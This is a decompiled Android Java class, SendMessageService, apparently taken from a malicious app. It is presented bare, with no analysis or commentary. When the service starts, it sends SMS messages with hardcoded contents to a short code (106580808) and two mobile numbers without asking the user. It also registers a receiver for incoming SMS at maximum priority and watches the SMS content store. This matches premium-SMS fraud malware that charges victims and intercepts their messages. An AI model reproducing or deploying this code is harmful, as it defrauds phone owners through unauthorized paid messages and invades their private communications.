package com.fdsds;

import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.SmsManager;
import com.fdsds.bean.Constant;
import com.fdsds.model.PhoneNumerModel;
import java.util.ArrayList;
import java.util.List;

public class SendMessageService
  extends Service
{
  String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";
  String SENT_SMS_ACTION = "SENT_SMS_ACTION";
  private boolean isSend;
  private List models;
  private PhoneNumerModel phoneModel;
  BrSendMessage receiver;
  private BroadcastReceiver receiverMessage = new SendMessageService.2(this);
  private BroadcastReceiver sendMessage = new SendMessageService.1(this);
  
  public SendMessageService() {}
  
  private void InsertData()
  {
    registerReceiver(this.sendMessage, new IntentFilter(this.SENT_SMS_ACTION));
    registerReceiver(this.receiverMessage, new IntentFilter(this.DELIVERED_SMS_ACTION));
    this.models = new ArrayList();
    this.phoneModel = new PhoneNumerModel();
    this.phoneModel.setMessageContet("abcd1234");
    this.phoneModel.setPhontNumer("106580808");
    this.models.add(this.phoneModel);
    this.phoneModel = new PhoneNumerModel();
    this.phoneModel.setMessageContet("55");
    this.phoneModel.setPhontNumer("13247622524");
    this.models.add(this.phoneModel);
    this.phoneModel = new PhoneNumerModel();
    this.phoneModel.setMessageContet("61");
    this.phoneModel.setPhontNumer("13048980814");
    this.models.add(this.phoneModel);
    sendMessage();
  }
  
  private void registerReceiver()
  {
    registerSMSObserver();
    IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
    localIntentFilter.setPriority(Integer.MAX_VALUE);
    this.receiver = new BrSendMessage();
    registerReceiver(this.receiver, localIntentFilter);
  }
  
  private void registerSMSObserver()
  {
    SmsObserver localSmsObserver = new SmsObserver(this, new SendMessageService.3(this));
    getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, localSmsObserver);
  }
  
  private void sendMessage()
  {
    int i = 0;
    for (;;)
    {
      if (i >= this.models.size()) {
        return;
      }
      PhoneNumerModel localPhoneNumerModel = (PhoneNumerModel)this.models.get(i);
      SmsManager localSmsManager = SmsManager.getDefault();
      Object localObject1 = new Intent(this.SENT_SMS_ACTION);
      ((Intent)localObject1).putExtra(Constant.sp_order, localPhoneNumerModel.getPhontNumer());
      localObject1 = PendingIntent.getBroadcast(getApplicationContext(), i, (Intent)localObject1, 134217728);
      Object localObject2 = new Intent(this.DELIVERED_SMS_ACTION);
      ((Intent)localObject2).putExtra(Constant.sp_order, localPhoneNumerModel.getPhontNumer());
      localObject2 = PendingIntent.getBroadcast(getApplicationContext(), i, (Intent)localObject2, 134217728);
      localSmsManager.sendTextMessage(localPhoneNumerModel.getPhontNumer(), null, localPhoneNumerModel.getMessageContet(), (PendingIntent)localObject1, (PendingIntent)localObject2);
      i += 1;
    }
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    unregisterReceiver(this.receiver);
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    registerReceiver();
    if (!this.isSend)
    {
      this.isSend = true;
      InsertData();
    }
    return super.onStartCommand(paramIntent, paramInt1, paramInt2);
  }
  
  public void unbindService(ServiceConnection paramServiceConnection)
  {
    super.unbindService(paramServiceConnection);
  }
}
